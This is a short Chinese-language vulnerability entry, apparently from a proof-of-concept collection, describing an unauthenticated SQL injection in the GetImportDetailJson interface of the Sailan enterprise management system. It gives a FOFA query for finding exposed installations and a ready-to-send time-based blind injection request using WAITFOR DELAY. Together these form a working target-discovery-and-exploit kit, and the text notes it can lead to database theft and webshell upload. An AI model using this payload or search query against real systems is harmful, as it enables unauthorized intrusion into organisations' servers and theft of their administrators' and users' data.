# 赛蓝企业管理系统GetImportDetailJson存在SQL注入漏洞

赛蓝企业管理系统 **GetImportDetailJson**接口处SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```java
GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+%270%3a0%3a5%27--&IsShow=1 HTTP/1.1
Host: {{Hostname}}
```

